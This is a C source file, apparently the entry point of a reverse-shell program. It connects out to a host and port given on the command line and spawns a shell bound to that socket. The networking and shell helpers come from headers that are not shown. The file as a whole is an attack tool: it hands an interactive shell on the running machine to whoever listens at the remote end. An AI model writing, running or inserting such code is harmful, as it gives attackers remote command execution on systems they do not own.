#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "net.h"
#include "shell.h"

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
        return 1;
    }

    if (net_init() != 0) { fprintf(stderr, "net_init failed\n"); return 1; }

    sock_t s = SOCK_INVALID;
    if (net_connect(&s, argv[1], argv[2]) != 0) {
        fprintf(stderr, "connect failed\n");
        net_cleanup();
        return 1;
    }

    shell_spawn(s);      /* blocks until shell exits */
    net_close(s);
    net_cleanup();
    return 0;
}